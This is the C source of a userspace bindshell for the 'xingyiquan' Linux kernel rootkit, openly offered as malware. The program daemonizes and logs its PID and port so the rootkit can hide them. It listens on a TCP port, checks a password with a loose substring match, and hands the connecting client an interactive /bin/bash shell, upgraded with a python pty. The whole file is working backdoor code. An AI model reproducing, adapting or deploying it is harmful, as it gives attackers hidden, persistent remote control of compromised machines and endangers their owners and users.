/*
 * userspace bindshell for xingyiquan lkm rootkit
 *  (c) Copyright by RingLayer All Rights Reserved 
 * Developed by Sw0rdm4n
 * 
 * Official Website : www.ringlayer.net
 * 
 * Ringlayer Public License Statement V.1
 * 1. This software is free software under copyright of Ringlayer's Public License
 * 2. You may copy / modify / redistribute / share / use this software freely, but you are not allowed to remove copyright / author / url (where you got the source) if you don't modify source code logic at least 50%
 * 3. You are not allowed to sell this source code without permission from author
 * 4. Violation of any terms above means author have some rights for law processing and right to fine 
 *
DISCLAIMER !!!
Author takes no responsibility for any abuse of this software. 
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
#include "xingyi_userspace_functions.h"
#include "xingyi_userspace_config.h"

#ifndef SOL_SOCKET 
#define SOL_SOCKET      1
#endif

#ifndef  SO_REUSEADDR 
#define SO_REUSEADDR    2
#endif

int main()
{
	int sock, result, sin_size, retme = 0;  
        struct sockaddr_in server_addr;   
	struct sockaddr_in client_addr;    	
	int true = 1;
	static const uint8_t BACKLOG = 4;
	FILE *pop = NULL;
	char *data;
	int use_python = 0, res = 0;
	char *ask_password = "Password :";
	char buf[17];
	char *wrong_passwd = "Wrong password";

	data = n_malloc(256);
	printf("\n");
	pop = popen("python --version", "r");
	if (pop != NULL) {
		fgets(data, 256, pop);
		if (strstr(data, "not found") == NULL)
			use_python = 1;
	}
	daemonize();
	retme = _write_pid_to_file(log_bind_pid);
	if (retme == -1 || retme == 0) 
		fprintf(stdout, "\nWarning ! failed to hide pid ! check your write file permission !\n");
 	retme = _log_file(log_bind_port, bind_port);
	if (retme == -1 || retme == 0) 
		fprintf(stdout, "\nWarning ! failed to hide port ! check your write file permission !\n");
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		fprintf(stdout,"Socket error  ! exit ! \n");
		return 1;
        }
	server_addr.sin_family = AF_INET;         
        server_addr.sin_port = htons(bind_port);     
        server_addr.sin_addr.s_addr = INADDR_ANY; 
        bzero(&(server_addr.sin_zero), 8); 
	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &true, sizeof(int)) == -1) 
		fprintf(stdout, "Failed to setsockopt for reuseaddr ! \n");
        if (bind(sock, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
		fprintf(stdout,"Bind failed ! exit ! \n");
		exit(-1);
        }
        if (listen(sock, BACKLOG) == -1) {
		fprintf(stdout,"Listen failed ! exit ! \n");
		exit(-1);
        }
	fflush(stdout);
	while(1) { 
		if ((result  = accept(sock, (struct sockaddr *)&client_addr,(socklen_t * __restrict__)(&sin_size))) >= 0) {
			write(result, ask_password, strlen(ask_password));
			res = read(result, buf, sizeof(buf));
			if (res > 0) {
				if ((strcmp(buf, bindshell_password) == 0) || (strstr(buf, bindshell_password) != NULL)) {
					dup2(result,2);
					dup2(result,1);
					dup2(result,0);
					if (use_python == 1)
						system("python -c 'import pty; pty.spawn(\"/bin/bash\")'");
					else
						system("/bin/bash");
					close(result);	
				}
				else {
					send(result, wrong_passwd, strlen(wrong_passwd), MSG_NOSIGNAL);
					close(result);
				}				
			}
		}
	}
	printf("\n");
	
	return 0;
}
